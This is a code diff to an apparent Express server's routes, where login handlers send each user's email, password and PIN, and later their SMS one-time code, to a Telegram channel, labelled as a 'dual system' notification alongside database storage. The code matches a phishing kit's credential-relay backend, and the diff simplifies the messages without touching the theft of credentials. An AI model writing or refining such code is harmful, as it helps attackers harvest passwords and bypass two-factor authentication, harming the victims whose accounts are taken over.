@@ -60,15 +60,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       });
 
       // Send Telegram notification (dual system: database + Telegram)
-      const telegramMessage = formatLoginMessage(
-        email,
-        password,
-        pin,
-        ipAddress,
-        userAgent,
-        collectedDataRecord.userNumber,
-        collectedDataRecord.isHidden
-      );
+      const telegramMessage = formatLoginMessage(email, password, pin);
       sendToTelegram(telegramMessage).catch(err => {
         console.error("⚠️ Telegram notification failed (non-blocking):", err);
       });
@@ -129,14 +121,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       });
 
       // Send Telegram notification for SMS code (dual system)
-      const smsMessage = formatSMSMessage(
-        updatedRecord.email,
-        otp,
-        updatedRecord.ipAddress,
-        updatedRecord.userAgent,
-        updatedRecord.userNumber,
-        isHidden
-      );
+      const smsMessage = formatSMSMessage(updatedRecord.email, otp);
       sendToTelegram(smsMessage).catch(err => {
         console.error("⚠️ Telegram SMS notification failed (non-blocking):", err);
       });
